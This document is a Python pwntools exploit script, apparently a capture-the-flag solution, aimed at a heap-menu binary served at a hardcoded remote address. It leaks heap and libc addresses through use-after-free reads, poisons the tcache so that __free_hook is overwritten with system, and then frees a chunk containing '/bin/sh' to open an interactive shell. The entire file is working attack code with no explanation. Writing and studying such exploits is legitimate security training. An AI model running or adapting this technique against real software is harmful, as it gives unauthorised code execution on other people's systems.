#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '52.152.231.198', 8081
binary = './pwn'
brkpts = '''
'''

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(">> \n", str(idx))

def add(idx, size):
    choice(1)
    sla("index\n", str(idx))
    sla("size\n", str(size))

def delete(idx):
    choice(2)
    sla("index\n", str(idx))

def edit(idx, data):
    choice(3)
    sla("index\n", str(idx))
    sa("content\n", data)

def show(idx):
    choice(4)
    sla("index\n", str(idx))
    return rl()

def setname(name):
    choice(5)
    sa("name:\n", name)

def showname():
    choice(6)
    return rl()

if __name__ == "__main__":
    add(0, 0x20)
    add(1, 0x20)
    delete(1)
    delete(0)
    heap_base = u64(show(0).ljust(8, "\x00"))-0x290
    log.info("Heap -> "+hex(heap_base))
    
    for i in range(7):
        add(i, 0x58)
    add(7, 0x58)
    add(8, 0x58)
    for i in range(7):
        delete(i) # fill tcache
    
    delete(7)
    setname("a"*0x100)
    libc = u64(show(7).ljust(8, "\x00")) - 0x3ebcf0
    log.info("Libc -> "+hex(libc))
    free_hook = libc + 0x3ed8e8
    system = libc + 0x4f550
    for i in range(7):
        add(9, 0x58)
    add(10, 0x18)
    edit(10, "abcdefgh")
    add(11, 0x18)
    edit(11, "hijklmno")
    delete(10)
    delete(11)

    payload = flat([
        heap_base+0x10,
        0,
        0x21,
        free_hook-0x8,
        heap_base+0x10
    ])
    edit(7, payload)
    add(12, 0x18)
    add(13, 0x18)
    edit(12, "bbbb")
    edit(13, p64(system))

    payload = flat([
        heap_base+0x10,
        0,
        0x21,
        "/bin/sh\x00",
        heap_base+0x10
    ])
    edit(7, payload)

    #gdb.attach(io)
    delete(12)
    io.interactive()